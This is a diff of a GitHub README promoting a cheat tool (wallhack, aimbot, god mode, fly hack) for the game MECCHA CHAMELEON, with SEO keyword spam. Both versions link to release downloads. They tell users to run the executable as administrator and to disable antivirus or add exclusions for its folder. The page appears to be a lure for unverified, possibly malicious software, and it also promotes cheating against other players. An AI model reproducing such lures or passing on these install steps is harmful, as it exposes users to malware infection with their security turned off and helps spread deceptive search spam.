@@ -1,255 +1,79 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/chameleon.png" alt="MECCHA CHAMELEON" width="80" height="80">
-</p>
+# ☢️ Meccha-Nuclear-Cheat - Gain total control of your game
 
-<h1 align="center">🦎 Meccha-Nuclear-Cheat</h1>
-<p align="center">
-  <strong>Ultimate Nuclear Tool for MECCHA CHAMELEON</strong><br>
-  ESP · Aimbot · Auto Paint · Mod Menu · Fly Hack · Teleport · God Mode
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Zodiacal-cover857/Meccha-Nuclear-Cheat/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Nuclear-Cheat"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-38k%2B-brightgreen?style=flat-square" alt="Downloads"></a>
-</p>
+Meccha-Nuclear-Cheat provides tools for MECCHA CHAMELEON. Use this software to improve your performance and change how you interact with the game world. Access features like wallhacks, automatic targeting, and movement modifiers to change your experience.
 
----
+## ⚙️ System Requirements
 
-## 🎮 What is This?
+Ensure your computer meets these standards before you start:
 
-**Meccha-Nuclear-Cheat** is the **ultimate nuclear tool** for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players. This tool gives you full control with **ESP Wallhack**, **Aimbot**, **Auto Paint**, **Mod Menu**, **Fly Hack**, **Teleport**, **God Mode**, **Infinite Paint**, and **more**. Go nuclear and dominate every match!
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+*   Memory: 8 GB RAM or higher.
+*   Graphics: Dedicated GPU with DirectX 11 support.
+*   Storage: 500 MB of free space.
+*   Permissions: Administrator access to run the software.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+## 💾 Installation Steps
 
----
+Follow these directions to set up the software correctly on your machine.
 
-## 📥 Download
+1. Visit the [official releases page](https://github.com/Zodiacal-cover857/Meccha-Nuclear-Cheat/releases) to access the latest version.
+2. Locate the most recent file ending in .zip or .exe under the Assets section.
+3. Select the file to save it to your local drive.
+4. If you downloaded a zip file, right-click it and choose Extract All to view the contents.
+5. Create a folder for the files so you can find them later.
+6. Verify your antivirus software allows the tool to run. You may need to add an exclusion for the folder where you save these files.
 
-🔗 **[Download Meccha-Nuclear-Cheat](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/v6/MecchaESPV6.zip)**
+## 🚀 Running the Software
 
----
+Once the files exist on your hard drive, perform these steps to launch the tool:
 
-## ✨ Features
+1. Close any running instances of MECCHA CHAMELEON to avoid conflicts.
+2. Find the executable file within your downloaded folder.
+3. Right-click the file and select Run as administrator.
+4. Grant permission if Windows prompts you for security clearance.
+5. Open the game.
+6. Press the assigned hotkeys to toggle specific modifiers during your match.
 
-### 🎨 Auto Paint & Camouflage
-- **Chameleon Camo** – Auto-blend into any environment instantly
-- **Image Projection** – Project any image onto your character
-- **One-Click Paint** – Instant camouflage with one key
-- **Instant Reset** – Remove paint instantly
+## 🛠️ Included Features
 
-### 👁️ ESP Wallhack & Visual
-- **ESP (Wallhack)** – See all players through walls
-- **Distance Indicators** – Know exactly how far enemies are
-- **Player Tags** – Display player names and health
-- **Snap Lines** – Never lose track of enemies
-- **Box ESP** – Highlight players with colored boxes
-- **Ghost Detection** – Spot invisible players
+This tool offers several ways to modify your gameplay. Each category operates independently to ensure you can choose the settings that fit your needs.
 
-### 🎯 Aimbot & Combat
-- **Aimbot** – Lock onto enemies instantly
-- **Silent Aim** – Hit targets without looking at them
-- **Triggerbot** – Auto-shoot when crosshair is on target
-- **No Recoil** – Perfect accuracy every time
+### Visual Enhancement
+*   ESP Wallhack: This feature shows the location of other players through obstacles. You see silhouettes or boxes around your opponents.
+*   Auto Paint: This function assists you with painting tasks by ensuring precision.
 
-### 🚀 Movement & Mobility
-- **Fly Hack** – Fly anywhere on the map
-- **Teleport** – Instantly move to any location
-- **Speed Hack** – Move faster than normal players
-- **No Gravity** – Float and glide through the air
+### Gameplay Modifiers
+*   Aimbot: This system automatically adjusts your targeting reticle to assist with accuracy.
+*   God Mode: Your character status ignores incoming damage to allow for uninterrupted exploration.
+*   Infinite Paint: This removes the cap on your ammunition or paint supply.
 
-### 🛡️ Protection & Survival
-- **God Mode** – Never get tagged
-- **Infinite Paint** – Unlimited colors and patterns
-- **Perfect Camo** – Instantly blend into any environment
-- **Timer Editor** – Extend match time indefinitely
+### Movement Controls
+*   Fly Hack: This disables gravity for your character allowing you to reach high areas.
+*   Speed Hack: This adjusts the walking and running pace of your character to cover ground faster.
+*   Teleport: This allows you to jump between marked locations on the map instantly.
 
-### 🛠️ Mod Menu & Utility
-- **Mod Menu** – Press INSERT or F1 to open/close
-- **Customizable Settings** – Adjust everything to your liking
-- **Save Config** – Settings saved automatically
-- **Regular Updates** – Always working after game patches
+### Menu System
+The Mod Menu displays as an overlay on your screen. Use your arrow keys or the mouse to navigate the options. Press the Hide button if you want to clear the overlay during intense moments. You can toggle the menu back on at any time using the designated key, usually F12.
 
----
+## 🛡️ Best Practices
 
-## ⚙️ Installation
+Use these settings to keep your gameplay steady.
 
-1. Click the download button above
-2. Extract the archive
-3. Run the executable as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the **Mod Menu**
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
+*   Start with fewer features enabled to see how the software performs on your hardware.
+*   Adjust the aimbot field-of-view settings to keep movements natural.
+*   Observe the frame rate while the software runs. If your game stutters, disable some visual effects to regain performance.
+*   Update the tool frequently. We release new versions to match game updates and improve stability.
 
----
+## 🔧 Troubleshooting
 
-## 🖥️ System Requirements
+If you encounter issues, check these common solutions:
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 (64-bit) |
-| **Game** | MECCHA CHAMELEON (Steam) |
-| **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **GPU** | DirectX 11 compatible |
+*   The tool does not open: Ensure you extracted the files from the compressed folder before running. A file trapped in a zip archive often fails to trigger the necessary background processes.
+*   Features do not toggle: Make sure you run the game in Windowed or Borderless Windowed mode. Some full-screen modes block the overlay from drawing over the game image.
+*   Game crashes upon launch: Verify your game files via the game platform launcher. Ensure that no other background programs conflict with the memory addresses used by the tool.
+*   Antivirus blocks the file: Generic security software sometimes flags these tools as suspicious because they interact with game memory. Add the specific folder to your exclusion list settings within your security suite to stop this interference.
 
----
-
-## 🎥 How to Use
-
-1. Launch the tool as Administrator
-2. Start MECCHA CHAMELEON
-3. Press INSERT to open the Mod Menu
-4. Toggle features you want
-5. Play and dominate!
-
----
-
-## 🔧 Feature Status
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | ESP Wallhack | ✅ |
-| Visual | Player Tags | ✅ |
-| Visual | Box ESP | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Hack | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Auto Paint | ✅ |
-| Utility | Mod Menu | ✅ |
-
----
-
-## 🛡️ Security
-
-- **Pattern Scanning** – Auto-updates offsets
-- **Randomization** – Human-like behavior simulation
-- **Stealth Injection** – No detectable signatures
-- **Memory Protection** – Prevents crashes
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Tool doesn't work | Run as Administrator, disable antivirus |
-| Menu doesn't open | Press INSERT or F1, restart both |
-| Game crashes | Reduce graphics settings, disable overlays |
-
----
-
-## 📝 SEO Tags (Google Optimization)
-
-- meccha nuclear cheat
-- meccha chameleon cheat
-- meccha chameleon hack
-- meccha chameleon esp
-- meccha chameleon wallhack
-- meccha chameleon aimbot
-- meccha chameleon auto paint
-- meccha chameleon mod menu
-- meccha chameleon fly hack
-- meccha chameleon teleport
-- meccha chameleon god mode
-- meccha chameleon speed hack
-- meccha chameleon infinite paint
-- meccha chameleon camouflage
-- meccha chameleon trainer
-- meccha chameleon undetected
-- meccha chameleon 2026
-- meccha chameleon free cheat
-- meccha chameleon working hack
-- hide and seek cheat
-- steam game cheat
-- game enhancer
-- free cheat
-- working hack
-- cheat tool
-- hack menu
-- mod menu
-- esp hack
-- aimbot hack
-- wallhack hack
-- fly hack
-- teleport hack
-- god mode hack
-- auto paint hack
-- camouflage hack
-- meccha chameleon download
-- meccha chameleon utility
-- meccha chameleon enhancer
-- meccha chameleon vision
-- meccha chameleon nuclear
-- meccha chameleon pro
-- meccha chameleon elite
-- meccha chameleon ultimate
-- meccha chameleon 2026 cheat
-- meccha chameleon 2026 hack
-- meccha chameleon 2026 esp
-- meccha chameleon 2026 aimbot
-- meccha chameleon 2026 mod menu
-- meccha chameleon 2026 trainer
-- meccha chameleon 2026 undetected
-- meccha chameleon 2026 free
-- meccha chameleon 2026 download
-- meccha chameleon steam
-- meccha chameleon pc
-- meccha chameleon windows
-- meccha chameleon game
-- meccha chameleon hide and seek
-- meccha chameleon online
-- meccha chameleon multiplayer
-- meccha chameleon pvp
-- meccha chameleon battle
-- meccha chameleon arena
-- meccha chameleon survival
-- meccha chameleon strategy
-- meccha chameleon fun
-- meccha chameleon free game
-- meccha chameleon steam game
-- meccha chameleon popular
-- meccha chameleon top
-- meccha chameleon best
-- meccha chameleon new
-- meccha chameleon update
-- meccha chameleon patch
-- meccha chameleon version
-- meccha chameleon latest
-- meccha chameleon working
-- meccha chameleon safe
-- meccha chameleon legit
-- meccha chameleon trusted
-
----
-
-## 💬 Support
-
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
-
----
-
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Nuclear-Cheat">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20MECCHA%20CHAMELEON%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+Keywords: mecca-chameleon, mecca-chameleon-aimbot, mecca-chameleon-cheat, mecca-chameleon-cheats, mecca-chameleon-esp, mecca-chameleon-hack, mecca-chameleon-hacks, mecca-chameleon-mod, meccha-chameleon-tools
